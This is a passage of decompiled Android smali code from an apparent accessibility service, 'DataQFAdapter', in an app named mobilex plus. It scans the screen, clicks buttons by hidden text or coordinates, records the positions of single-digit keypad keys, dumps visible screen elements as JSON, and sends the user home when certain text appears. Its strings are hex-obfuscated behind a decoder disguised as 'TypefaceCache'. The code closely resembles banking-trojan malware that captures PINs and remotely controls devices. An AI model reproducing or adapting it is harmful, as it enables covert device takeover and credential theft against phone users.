    const-string v2, "0027007F0048008600F200B300D7"

    .line 409
    .line 410
    invoke-static {v2}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 411
    .line 412
    .line 413
    move-result-object v2

    .line 414
    const-string v3, "047D0454040104DC04DE0498048A0485040F"

    nop

    .line 415
    .line 416
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 417
    .line 418
    .line 419
    move-result-object v3

    .line 420
    filled-new-array {v0, v1, v2, v3}, [Ljava/lang/String;

    .line 421
    .line 422
    .line 423
    move-result-object v0

    .line 424
    invoke-direct {p0, p1, v0}, Lapp/mobilex/plus/services/DataQFAdapter;->findAnyText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z

    .line 425
    .line 426
    .line 427
    move-result v0

    .line 428
    if-eqz v0, :cond_9

    .line 429
    .line 430
    const-string v0, "00180051006E00A600C2009B00EF00E7000200750058008200E300AC00DB00A5002A007A0052009300E900FF00C600A8002400710057008200B000BB00D700B300260075004F008200F400FF009A00B7002800710006"

    .line 431
    .line 432
    invoke-static {v0}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 433
    .line 434
    .line 435
    invoke-direct {p0}, Lapp/mobilex/plus/services/DataQFAdapter;->blockAndGoHome()V
    :try_end_b
    .catchall {:try_start_b .. :try_end_b} :catchall_0

    .line 436
    .line 437
    .line 438
    goto/16 :goto_2

    .line 439
    :goto_3
    :try_start_c
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_4

    .line 440
    .line 441
    .line 442
    :catch_4
    :try_start_d
    throw v0
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_5

    .line 443
    :catch_5
    :cond_b
    :goto_4
    return-void

    nop

    nop
.end method

.method private final clickNodeAtCoords(II)Z
    .locals 2

    .line 1
    const/4 v0, 0x0

    .line 2
    :try_start_0
    invoke-virtual {p0}, Landroid/accessibilityservice/AccessibilityService;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 3
    .line 4
    .line 5
    move-result-object v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_6

    .line 6
    if-nez v1, :cond_0

    .line 7
    .line 8
    return v0

    .line 9
    :cond_0
    :try_start_1
    invoke-direct {p0, v1, p1, p2}, Lapp/mobilex/plus/services/DataQFAdapter;->findClickableNodeAt(Landroid/view/accessibility/AccessibilityNodeInfo;II)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 10
    .line 11
    .line 12
    move-result-object p1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_4

    .line 13
    if-eqz p1, :cond_1

    .line 14
    .line 15
    const/16 p2, 0x10

    .line 16
    .line 17
    :try_start_2
    invoke-virtual {p1, p2}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 18
    .line 19
    .line 20
    :try_start_3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 21
    .line 22
    .line 23
    :catchall_0
    :try_start_4
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_1

    .line 24
    .line 25
    .line 26
    :catchall_1
    const/4 p1, 0x1

    .line 27
    return p1

    .line 28
    :catchall_2
    move-exception p2

    .line 29
    :try_start_5
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    .line 30
    .line 31
    .line 32
    :catchall_3
    :try_start_6
    throw p2
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_4

    .line 33
    :catchall_4
    move-exception p1

    nop

    nop

    .line 34
    goto :goto_0

    .line 35
    :cond_1
    :try_start_7
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_7
    .catchall {:try_start_7 .. :try_end_7} :catchall_6

    .line 36
    .line 37
    .line 38
    goto/16 :goto_1

    nop

    nop

    .line 39
    :goto_0
    :try_start_8
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_8
    .catchall {:try_start_8 .. :try_end_8} :catchall_5

    .line 40
    .line 41
    .line 42
    :catchall_5
    :try_start_9
    throw p1
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_6

    .line 43
    :catchall_6
    :goto_1
    return v0
.end method

.method private final varargs clickNodeWithText(Landroid/view/accessibility/AccessibilityNodeInfo;[Ljava/lang/String;)Z
    .locals 10

    .line 1
    array-length v0, p2

    .line 2
    const/4 v1, 0x0

    .line 3
    move v2, v1

    .line 4
    :goto_0
    if-ge v2, v0, :cond_8

    .line 5
    .line 6
    aget-object v3, p2, v2

    .line 7
    .line 8
    :try_start_0
    invoke-virtual {p1, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByText(Ljava/lang/String;)Ljava/util/List;

    .line 9
    .line 10
    .line 11
    move-result-object v4

    .line 12
    if-eqz v4, :cond_7

    .line 13
    .line 14
    invoke-interface {v4}, Ljava/util/Collection;->isEmpty()Z

    .line 15
    .line 16
    .line 17
    move-result v5

    .line 18
    if-eqz v5, :cond_0

    .line 19
    .line 20
    goto/16 :goto_6

    .line 21
    .line 22
    :cond_0
    invoke-interface {v4}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 23
    .line 24
    .line 25
    move-result-object v4

    .line 26
    :goto_1
    invoke-interface {v4}, Ljava/util/Iterator;->hasNext()Z

    .line 27
    .line 28
    .line 29
    move-result v5

    .line 30
    if-eqz v5, :cond_7

    .line 31
    .line 32
    invoke-interface {v4}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 33
    .line 34
    .line 35
    move-result-object v5

    nop

    .line 36
    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 37
    .line 38
    :try_start_1
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 39
    .line 40
    .line 41
    move-result-object v6

    .line 42
    if-eqz v6, :cond_1

    .line 43
    .line 44
    invoke-virtual {v6}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 45
    .line 46
    .line 47
    move-result-object v6

    .line 48
    if-eqz v6, :cond_1

    .line 49
    .line 50
    sget-object v7, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 51
    .line 52
    invoke-virtual {v6, v7}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 53
    .line 54
    .line 55
    move-result-object v6

    .line 56
    goto :goto_2

    nop

    .line 57
    :catchall_0
    move-exception v3

    nop

    .line 58
    goto :goto_5

    .line 59
    :cond_1
    const-string v6, ""

    .line 60
    .line 61
    :goto_2
    sget-object v7, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 62
    .line 63
    invoke-virtual {v3, v7}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 64
    .line 65
    .line 66
    move-result-object v7

    .line 67
    invoke-static {v6, v7, v1}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 68
    .line 69
    .line 70
    move-result v6

    .line 71
    if-eqz v6, :cond_6

    .line 72
    .line 73
    move v6, v1

    nop

    .line 74
    move-object/from16 v7, v5

    .line 75
    :goto_3
    const/16 v8, 0x5

    .line 76
    if-ge v6, v8, :cond_5

    .line 77
    .line 78
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    .line 79
    .line 80
    .line 81
    move-result v8

    .line 82
    if-eqz v8, :cond_2

    .line 83
    .line 84
    const v3, 0x10

    .line 85
    .line 86
    invoke-virtual {v7, v3}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 87
    .line 88
    .line 89
    :try_start_2
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0

    .line 90
    .line 91
    .line 92
    const/4 p1, 0x1

    .line 93
    return p1

    .line 94
    :cond_2
    :try_start_3
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->getParent()Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 95
    .line 96
    .line 97
    move-result-object v8

    .line 98
    if-nez v8, :cond_3

    .line 99
    .line 100
    goto :goto_4

    .line 101
    :cond_3
    invoke-virtual {v7, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 102
    .line 103
    .line 104
    move-result v9

    .line 105
    if-nez v9, :cond_4

    .line 106
    .line 107
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 108
    .line 109
    .line 110
    :cond_4
    add-int/lit8 v6, v6, 0x1

    .line 111
    .line 112
    move-object v7, v8

    .line 113
    goto :goto_3

    .line 114
    :cond_5
    :goto_4
    invoke-virtual {v7, v5}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 115
    .line 116
    .line 117
    move-result v6

    nop

    nop

    .line 118
    if-nez v6, :cond_6

    .line 119
    .line 120
    invoke-virtual {v7}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 121
    .line 122
    .line 123
    :cond_6
    :try_start_4
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 124
    .line 125
    .line 126
    goto :goto_1

    .line 127
    :goto_5
    invoke-virtual {v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V

    .line 128
    .line 129
    .line 130
    throw v3
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0

    .line 131
    :catch_0
    :cond_7
    :goto_6
    add-int/lit8 v2, v2, 0x1

    .line 132
    .line 133
    goto/16 :goto_0

    .line 134
    .line 135
    :cond_8
    return v1
.end method

.method private final collectClickableDigits(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/HashMap;I)V
    .locals 7
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            "Ljava/util/HashMap<",
            "Ljava/lang/String;",
            "Landroid/graphics/Rect;",
            ">;I)V"
        }
    .end annotation

    .line 1
    const-string v0, "\u232b"

    .line 2
    .line 3
    const/16 v1, 0x14

    .line 4
    .line 5
    if-le p3, v1, :cond_0

    nop

    .line 6
    .line 7
    goto/16 :goto_4

    .line 8
    .line 9
    :cond_0
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 10
    .line 11
    .line 12
    move-result-object v1
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_3

    .line 13
    const-string v2, ""

    .line 14
    .line 15
    if-eqz v1, :cond_1

    .line 16
    .line 17
    :try_start_1
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 18
    .line 19
    .line 20
    move-result-object v1

    .line 21
    if-nez v1, :cond_2

    nop

    .line 22
    .line 23
    :cond_1
    move-object/from16 v1, v2

    .line 24
    :cond_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    .line 25
    .line 26
    .line 27
    move-result-object v3

    .line 28
    if-eqz v3, :cond_4

    .line 29
    .line 30
    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 31
    .line 32
    .line 33
    move-result-object v3

    .line 34
    if-nez v3, :cond_3

    nop

    .line 35
    .line 36
    goto/16 :goto_0

    .line 37
    :cond_3
    move-object/from16 v2, v3

    .line 38
    :cond_4
    :goto_0
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 39
    .line 40
    .line 41
    move-result v3

    .line 42
    if-nez v3, :cond_5

    .line 43
    .line 44
    move-object/from16 v1, v2

    .line 45
    :cond_5
    new-instance v2, Landroid/graphics/Rect;

    .line 46
    .line 47
    invoke-direct {v2}, Landroid/graphics/Rect;-><init>()V

    .line 48
    .line 49
    .line 50
    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 51
    .line 52
    .line 53
    invoke-virtual {v2}, Landroid/graphics/Rect;->width()I

    .line 54
    .line 55
    .line 56
    move-result v3

    .line 57
    const/16 v4, 0x1e

    .line 58
    .line 59
    const/4 v5, 0x1

    .line 60
    const/4 v6, 0x0

    .line 61
    if-lt v3, v4, :cond_6

    .line 62
    .line 63
    invoke-virtual {v2}, Landroid/graphics/Rect;->height()I

    .line 64
    .line 65
    .line 66
    move-result v3

    .line 67
    if-lt v3, v4, :cond_6

    .line 68
    .line 69
    move v3, v5

    .line 70
    goto :goto_1

    .line 71
    :cond_6
    move v3, v6

    nop

    nop

    .line 72
    :goto_1
    invoke-virtual {v1}, Ljava/lang/String;->length()I

    .line 73
    .line 74
    .line 75
    move-result v4

    .line 76
    if-ne v4, v5, :cond_7

    .line 77
    .line 78
    invoke-virtual {v1, v6}, Ljava/lang/String;->charAt(I)C

    .line 79
    .line 80
    .line 81
    move-result v4

    .line 82
    invoke-static {v4}, Ljava/lang/Character;->isDigit(C)Z

    .line 83
    .line 84
    .line 85
    move-result v4

    nop

    nop

    .line 86
    if-eqz v4, :cond_7

    .line 87
    .line 88
    if-eqz v3, :cond_7

    .line 89
    .line 90
    invoke-interface {p2, v1, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 91
    .line 92
    .line 93
    :cond_7
    if-eqz v3, :cond_9

    .line 94
    .line 95
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isClickable()Z

    .line 96
    .line 97
    .line 98
    move-result v3

    .line 99
    if-eqz v3, :cond_9

    .line 100
    .line 101
    sget-object v3, Ljava/util/Locale;->ROOT:Ljava/util/Locale;

    .line 102
    .line 103
    invoke-virtual {v1, v3}, Ljava/lang/String;->toLowerCase(Ljava/util/Locale;)Ljava/lang/String;

    .line 104
    .line 105
    .line 106
    move-result-object v1

    .line 107
    invoke-virtual {v1, v0}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 108
    .line 109
    .line 110
    move-result v3

    .line 111
    if-nez v3, :cond_8

    .line 112
    .line 113
    const-string v3, "002100770058008C00E300AF00D300A40026"

    .line 114
    .line 115
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 116
    .line 117
    .line 118
    move-result-object v3

    .line 119
    invoke-static {v1, v3, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 120
    .line 121
    .line 122
    move-result v3

    .line 123
    if-nez v3, :cond_8

    .line 124
    .line 125
    const-string v3, "002700730057008200E400BA"

    .line 126
    .line 127
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 128
    .line 129
    .line 130
    move-result-object v3

    .line 131
    invoke-static {v1, v3, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 132
    .line 133
    .line 134
    move-result v3

    .line 135
    if-nez v3, :cond_8

    .line 136
    .line 137
    const-string v3, "04000422040B04DC04A8049D04FE"

    .line 138
    .line 139
    invoke-static {v3}, Lapp/mobilex/plus/util/TypefaceCache;->checked(Ljava/lang/String;)Ljava/lang/String;

    .line 140
    .line 141
    .line 142
    move-result-object v3

    .line 143
    invoke-static {v1, v3, v6}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 144
    .line 145
    .line 146
    move-result v3

    .line 147
    if-nez v3, :cond_8

    .line 148
    .line 149
    invoke-virtual {v1, v0}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    .line 150
    .line 151
    .line 152
    move-result v1

    .line 153
    if-eqz v1, :cond_9

    .line 154
    .line 155
    :cond_8
    invoke-interface {p2, v0, v2}, Ljava/util/Map;->put(Ljava/lang/Object;Ljava/lang/Object;)Ljava/lang/Object;

    .line 156
    .line 157
    .line 158
    :cond_9
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 159
    .line 160
    .line 161
    move-result v0

    .line 162
    :goto_2
    if-ge v6, v0, :cond_b

    .line 163
    .line 164
    invoke-virtual {p1, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 165
    .line 166
    .line 167
    move-result-object v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_3

    .line 168
    if-nez v1, :cond_a

    .line 169
    .line 170
    goto/16 :goto_3

    .line 171
    :cond_a
    add-int/lit8 v2, p3, 0x1

    .line 172
    .line 173
    :try_start_2
    invoke-direct {p0, v1, p2, v2}, Lapp/mobilex/plus/services/DataQFAdapter;->collectClickableDigits(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/HashMap;I)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 174
    .line 175
    .line 176
    :try_start_3
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 177
    .line 178
    .line 179
    :catchall_0
    :goto_3
    add-int/lit8 v6, v6, 0x1

    nop

    .line 180
    .line 181
    goto/16 :goto_2

    .line 182
    :catchall_1
    move-exception p1

    .line 183
    :try_start_4
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 184
    .line 185
    .line 186
    :catchall_2
    :try_start_5
    throw p1
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    .line 187
    :catchall_3
    :cond_b
    :goto_4
    return-void
.end method

.method private final collectDigitNodes(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;I)V
    .locals 5
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            "Ljava/util/List<",
            "Lv/s/yI1KTRoNlsjx;",
            ">;I)V"
        }
    .end annotation

    .line 1
    const/16 v0, -0x2b

    add-int/lit8 v0, v0, 0x3a

    .line 2
    .line 3
    if-gt p3, v0, :cond_8

    .line 4
    .line 5
    invoke-interface {p2}, Ljava/util/List;->size()I

    .line 6
    .line 7
    .line 8
    move-result v0

    .line 9
    const v1, 0x1e

    nop

    .line 10
    .line 11
    if-le v0, v1, :cond_0

    .line 12
    .line 13
    goto/16 :goto_3

    .line 14
    .line 15
    :cond_0
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    .line 16
    .line 17
    .line 18
    move-result-object v0
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_3

    .line 19
    const-string v1, ""

    .line 20
    .line 21
    if-eqz v0, :cond_1

    .line 22
    .line 23
    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 24
    .line 25
    .line 26
    move-result-object v0

    .line 27
    if-nez v0, :cond_2

    .line 28
    .line 29
    :cond_1
    move-object v0, v1

    .line 30
    :cond_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    .line 31
    .line 32
    .line 33
    move-result-object v2

    .line 34
    if-eqz v2, :cond_4

    nop

    .line 35
    .line 36
    invoke-virtual {v2}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 37
    .line 38
    .line 39
    move-result-object v2

    .line 40
    if-nez v2, :cond_3

    .line 41
    .line 42
    goto :goto_0

    .line 43
    :cond_3
    move-object v1, v2

    nop

    nop

    .line 44
    :cond_4
    :goto_0
    invoke-interface {v0}, Ljava/lang/CharSequence;->length()I

    .line 45
    .line 46
    .line 47
    move-result v2

    .line 48
    if-nez v2, :cond_5

    .line 49
    .line 50
    move-object/from16 v0, v1

    nop

    .line 51
    :cond_5
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    .line 52
    .line 53
    .line 54
    move-result v1

    .line 55
    const/4 v2, 0x0

    .line 56
    const/16 v3, 0x1

    .line 57
    if-ne v1, v3, :cond_6

    .line 58
    .line 59
    invoke-virtual {v0, v2}, Ljava/lang/String;->charAt(I)C

    .line 60
    .line 61
    .line 62
    move-result v1

    .line 63
    invoke-static {v1}, Ljava/lang/Character;->isDigit(C)Z

    .line 64
    .line 65
    .line 66
    move-result v1

    .line 67
    if-eqz v1, :cond_6

    .line 68
    .line 69
    new-instance v1, Landroid/graphics/Rect;

    .line 70
    .line 71
    invoke-direct {v1}, Landroid/graphics/Rect;-><init>()V

    .line 72
    .line 73
    .line 74
    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 75
    .line 76
    .line 77
    invoke-virtual {v1}, Landroid/graphics/Rect;->width()I

    .line 78
    .line 79
    .line 80
    move-result v4

    nop

    .line 81
    if-lez v4, :cond_6

    .line 82
    .line 83
    invoke-virtual {v1}, Landroid/graphics/Rect;->height()I

    .line 84
    .line 85
    .line 86
    move-result v4

    .line 87
    if-lez v4, :cond_6

    nop

    .line 88
    .line 89
    new-instance v4, Lv/s/yI1KTRoNlsjx;

    .line 90
    .line 91
    invoke-direct {v4, v0, v1}, Lv/s/yI1KTRoNlsjx;-><init>(Ljava/lang/Object;Ljava/lang/Object;)V

    .line 92
    .line 93
    .line 94
    invoke-interface {p2, v4}, Ljava/util/List;->add(Ljava/lang/Object;)Z

    .line 95
    .line 96
    .line 97
    :cond_6
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChildCount()I

    .line 98
    .line 99
    .line 100
    move-result v0

    .line 101
    :goto_1
    if-ge v2, v0, :cond_8

    .line 102
    .line 103
    invoke-virtual {p1, v2}, Landroid/view/accessibility/AccessibilityNodeInfo;->getChild(I)Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 104
    .line 105
    .line 106
    move-result-object v1
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_3

    .line 107
    if-nez v1, :cond_7

    .line 108
    .line 109
    goto :goto_2

    .line 110
    :cond_7
    add-int/lit8 v4, p3, 0x1

    .line 111
    .line 112
    :try_start_2
    invoke-direct {p0, v1, p2, v4}, Lapp/mobilex/plus/services/DataQFAdapter;->collectDigitNodes(Landroid/view/accessibility/AccessibilityNodeInfo;Ljava/util/List;I)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_1

    .line 113
    .line 114
    .line 115
    :try_start_3
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 116
    .line 117
    .line 118
    :catchall_0
    :goto_2
    add-int/lit8 v2, v2, 0x1

    .line 119
    .line 120
    goto :goto_1

    .line 121
    :catchall_1
    move-exception p1

    nop

    nop

    .line 122
    :try_start_4
    invoke-virtual {v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->recycle()V
    :try_end_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 123
    .line 124
    .line 125
    :catchall_2
    :try_start_5
    throw p1
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_3

    .line 126
    :catchall_3
    :cond_8
    :goto_3
    return-void
.end method

.method private final collectElements(Landroid/view/accessibility/AccessibilityNodeInfo;Lorg/json/JSONArray;I)V
    .locals 11

    .line 1
    const-string v0, "0079007F005F00C8"

    .line 2
    .line 3
    const/16 v1, 0xf

    .line 4
    .line 5
    if-le p3, v1, :cond_0

    nop

    nop

    .line 6
    .line 7
    goto/16 :goto_11

    .line 8
    .line 9
    :cond_0
    :try_start_0
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->isVisibleToUser()Z

    .line 10
    .line 11
    .line 12
    move-result v1

    .line 13
    if-nez v1, :cond_1

    .line 14
    .line 15
    goto/16 :goto_11

    .line 16
    .line 17
    :cond_1
    new-instance v1, Landroid/graphics/Rect;

    .line 18
    .line 19
    invoke-direct {v1}, Landroid/graphics/Rect;-><init>()V

    .line 20
    .line 21
    .line 22
    invoke-virtual {p1, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    .line 23
    .line 24
    .line 25
    invoke-virtual {v1}, Landroid/graphics/Rect;->width()I

    .line 26
    .line 27
    .line 28
    move-result v2

    .line 29
    const/16 v3, 0x5

    .line 30
    const/4 v4, 0x1

    .line 31
    const/4 v5, 0x0

    .line 32
    if-lt v2, v3, :cond_31

    .line 33
    .line 34
    invoke-virtual {v1}, Landroid/graphics/Rect;->height()I

    .line 35
    .line 36
    .line 37
    move-result v2

    nop

    nop

    .line 38
    if-ge v2, v3, :cond_2

    nop

    .line 39
    .line 40
    goto/16 :goto_f

    .line 41
    .line 42
    :cond_2
    new-instance v2, Lorg/json/JSONObject;

    .line 43
    .line 44
    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    .line 45
    .line 46
    .line 47
    const-string v3, "x"

    .line 48
    .line 49
    iget v6, v1, Landroid/graphics/Rect;->left:I

    .line 50
    .line 51
    invoke-virtual {v2, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 52
    .line 53
    .line 54
    const-string v3, "y"

    .line 55
    .line 56
    iget v6, v1, Landroid/graphics/Rect;->top:I

    nop

    .line 57
    .line 58
    invoke-virtual {v2, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 59
    .line 60
    .line 61
    const-string v3, "w"

    .line 62
    .line 63
    invoke-virtual {v1}, Landroid/graphics/Rect;->width()I

    .line 64
    .line 65
    .line 66
    move-result v6

    .line 67
    invoke-virtual {v2, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 68
    .line 69
    .line 70
    const-string v3, "h"

    .line 71
    .line 72
    invoke-virtual {v1}, Landroid/graphics/Rect;->height()I

    .line 73
    .line 74
    .line 75
    move-result v6

    .line 76
    invoke-virtual {v2, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 77
    .line 78
    .line 79
    const-string v3, "cx"

    .line 80
    .line 81
    invoke-virtual {v1}, Landroid/graphics/Rect;->centerX()I

    .line 82
    .line 83
    .line 84
    move-result v6

    .line 85
    invoke-virtual {v2, v3, v6}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 86
    .line 87
    .line 88
    const-string v3, "cy"

    .line 89
    .line 90
    invoke-virtual {v1}, Landroid/graphics/Rect;->centerY()I

    .line 91
    .line 92
    .line 93
    move-result v1

    .line 94
    invoke-virtual {v2, v3, v1}, Lorg/json/JSONObject;->put(Ljava/lang/String;I)Lorg/json/JSONObject;

    .line 95
    .line 96
    .line 97
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    .line 98
    .line 99
    .line 100
    move-result-object v1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 101
    const-string v3, ""

    .line 102
    .line 103
    if-eqz v1, :cond_3

    .line 104
    .line 105
    :try_start_1
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    .line 106
    .line 107
    .line 108
    move-result-object v1

    .line 109
    if-nez v1, :cond_4

    .line 110
    .line 111
    goto :goto_0

    .line 112
    :catch_0
    move-exception p1

    .line 113
    goto/16 :goto_12

    .line 114
    .line 115
    :cond_3
    :goto_0
    move-object/from16 v1, v3

    .line 116
    :cond_4
    const-string v6, "00130077004F009300F500AD00DC0091002A0073004C"

    .line 117
    .line 118
    invoke-static {v6}, Lapp/mobilex/plus/util/TypefaceCache;->obtain(Ljava/lang/String;)Ljava/lang/String;

    .line 119
    .line 120
    .line 121
    move-result-object v6

    .line 122
    invoke-static {v1, v6, v5}, Lv/s/KgSM0TsKUpCiuePB;->VEkRsTDS6a9oHWI(Ljava/lang/CharSequence;Ljava/lang/CharSequence;Z)Z

    .line 123
    .line 124
    .line 125
    move-result v6
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 126
    const-string v7, "0035007F005E0090"

    .line 127
